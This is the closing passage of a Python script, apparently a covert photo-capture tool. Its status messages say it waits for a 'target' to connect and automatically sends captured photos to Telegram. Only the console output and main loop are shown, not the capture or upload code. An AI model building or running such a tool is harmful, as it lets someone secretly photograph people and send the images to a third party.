    print(f"{GREEN}[✓]{RESET} Photos will automatically be sent to Telegram")
    print(f"{YELLOW}[*]{RESET} Waiting for target to connect...\n")
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
            
            # Show status every 30 seconds
            if len(captured_photos) > 0 and int(time.time()) % 30 == 0:
                print(f"  {CYAN}[*]{RESET} Photos captured: {len(captured_photos)}")
                
    except KeyboardInterrupt:
        signal_handler(None, None)


if __name__ == "__main__":
    main()